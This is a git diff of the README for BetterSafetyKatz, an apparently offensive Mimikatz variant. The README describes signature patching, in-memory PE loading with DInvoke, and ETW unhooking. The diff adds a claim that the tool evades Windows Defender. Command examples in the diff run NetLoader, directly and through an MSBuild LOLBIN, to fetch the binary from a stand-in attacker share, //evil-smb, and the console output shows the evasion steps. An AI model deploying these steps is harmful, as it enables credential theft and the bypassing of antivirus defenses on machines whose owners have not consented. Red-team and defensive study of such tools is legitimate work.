@@ -8,7 +8,7 @@ runtime patching on detected signatures and uses SharpSploit DInvoke to get it i
     (Used https://github.com/matterpreter/DefenderCheck to gather signatures detected)
 3. PE-Loaded into mem using SharpSploit 1.6 DInvoke, bypassing API hooking.(https://thewover.github.io/Dynamic-Invoke/)
 
-Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
+Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
 
 [@harmj0y](https://twitter.com/harmj0y) is the primary author of the port that this repo is forked from.
 
@@ -16,7 +16,7 @@ BetterSafetyKatz is licensed under the BSD 3-Clause license.
 
 ## Detected?
 
-BetterSafetyKatz can be deployed using [NetLoader](https://github.com/Flangvik/NetLoader), this might bypass common AV solutions such as Windows Defender.
+BetterSafetyKatz is NOT (21.06.2020) currently detected by windows defender, when that happens, BetterSafetyKatz can be deployed using [NetLoader](https://github.com/Flangvik/NetLoader), this will keep bypassing common AV solutions such as Windows Defender.
 
 	PS D:\Projects\NetLoader> .\NetLoader.exe --path //evil-smb/bins/BetterSafetyKatz.exe --args coffee
 	[!] ~Flangvik , ~Arno0x #NetLoader
@@ -24,9 +24,10 @@ BetterSafetyKatz can be deployed using [NetLoader](https://github.com/Flangvik/N
 	[+] Successfully unhooked ETW!
 	[+] URL/PATH : //evil-smb/bins/BetterSafetyKatz.exe
 	[+] Arguments : coffee
-	[+] Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
+	[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
 	[+] Contacting repo -> 2.2.0-20200519/mimikatz_trunk.zip
 	[+] Randomizing strings in memory
+	[+] Suicide burn before CreateThread!
 
 	  .#####.   022PO6WM 2.2.0 (x64) #19041 May 19 2020 00:48:59
 	 .## ^ ##.  "2HREDZLQ6LC4KWE48WS" - (J888K)
@@ -59,26 +60,18 @@ Or via the NetLoader MSBuild LOLBIN
 	[+] Successfully unhooked ETW!
 	[+] URL/PATH : //evil-smb/bins/BetterSafetyKatz.exe
 	[+] Arguments : coffee
-	[+] Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
+	[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
 	[+] Contacting repo -> 2.2.0-20200519/mimikatz_trunk.zip
 	[+] Randomizing strings in memory
+	[+] Suicide burn before CreateThread!
 
-	  .#####.   022PO6WM 2.2.0 (x64) #19041 May 19 2020 00:48:59
-	 .## ^ ##.  "2HREDZLQ6LC4KWE48WS" - (J888K)
-	 ## / \ ##  /*** SX6HATY8UCZTFP `3I6B0MYQ03` ( 66OC8VHW@3I6B0MYQ03.com )
-	 ## \ / ##       > http://blog.3I6B0MYQ03.com/022PO6WM
-	 '## v ##'       KVY3O5BG9LH90CH             ( EWGZ4I5Z22719E0QZJTNFIJF )
-	  '#####'        > VOIN6NBQ5J7P55TZBTT4H / WXFFZUHZ5JPERL93VZ3VC1W   ***/
+	  .#####.   68ZIE9AI 2.2.0 (x64) #19041 May 19 2020 00:48:59
+	 .## ^ ##.  "I45FONZV6HINDTWWCMW" - (HVTPW)
+	 ## / \ ##  /*** F9FCR04M16WWWI `7SG36P16CR` ( GKMPJ36E@7SG36P16CR.com )
+	 ## \ / ##       > http://blog.7SG36P16CR.com/68ZIE9AI
+	 '## v ##'       FI7NFZ4XC3AJPVJ             ( JUEZ6AM590TQM1Q7NX6675W0 )
+	  '#####'        > 8GPZN7NSKR7J2QHBC8U2I / Y14PE2OPZ62A7LF9UP91WYX   ***/
 
-	022PO6WM # coffee
-
-		( (
-		 ) )
-	  .______.
-	  |      |]
-	  \      /
-	   `----'
-
-	022PO6WM #
+	68ZIE9AI #
 	
 
